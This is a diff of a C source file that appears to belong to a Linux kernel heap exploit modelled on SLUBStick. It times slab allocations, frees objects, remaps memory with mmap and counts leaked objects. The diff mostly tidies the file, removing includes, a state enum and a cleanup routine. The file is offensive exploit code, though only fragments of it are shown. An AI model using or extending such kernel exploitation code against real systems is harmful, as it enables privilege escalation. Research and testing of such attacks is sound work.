@@ -1,17 +1,8 @@
 #include "libs/pwn.h"
-#include "libs/gfp_types.h"
-#include <stdlib.h>
-#include <strings.h>
-#include <unistd.h>
 
 /*
  * inspired by https://github.com/IAIK/SLUBStick
  */
-
-
-void *keap_vuln;
-#define YIELD(i) do { for (size_t _i = 0; _i < i; ++_i) sched_yield(); } while (0)
-#define THRESHOLD -800
 
 void** objs;
 void alloc_obj(size_t i)
@@ -33,14 +24,7 @@ void alloc_objs(void)
         alloc_obj(i);
 }
 
-enum state {
-    INIT = 0,
-    INVALID_FREE,
-    ALLOC_CONTD,
-    WRITE,
-    PAGE_TABLE_ACCESS,
-};
-
+#define THRESHOLD -800
 void timed_alloc_objs(void)
 {
     int ret;
@@ -124,7 +108,7 @@ void free_objs_and_alloc_mmap(void)
 
 size_t get_leaks() {
     size_t leaks = 0;
-    char *leak[cur->size];
+    char leak[cur->size];
 
     for (size_t i = 0; i < cur->slab_per_chunk; ++i) {
         for (ssize_t j = 0; j < (ssize_t)cur->objs_per_slab; ++j) {
@@ -137,12 +121,6 @@ size_t get_leaks() {
     linfo("got %ld/%ld successfull leaks", leaks, cur->slab_per_chunk * cur->objs_per_slab);
 
     return leaks;
-}
-
-void cleanup(void) {
-    for (size_t i = cur->allocs; i < cur->allocs * 2; ++i) {
-        free_obj(i);
-    }
 }
 
 /**
@@ -174,8 +152,6 @@ int main(int argc, char *argv[])
     leaks = get_leaks();
 
     lstage("done");
-
-    cleanup();
 
     return leaks > 0 ? EXIT_SUCCESS : EXIT_FAILURE;
 
